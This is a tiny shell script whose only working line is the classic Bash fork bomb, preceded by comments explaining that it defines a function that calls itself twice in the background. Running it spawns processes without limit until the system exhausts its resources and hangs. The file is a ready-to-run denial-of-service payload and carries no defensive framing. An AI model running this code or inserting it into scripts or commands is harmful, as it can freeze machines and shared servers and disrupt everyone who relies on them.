#!/bin/sh
# Classic fork bomb! Call a function twice from inside a function.
# This is the equivalent of  
# function() {
#    function | function &
# };
# function

:(){ :|: & };:
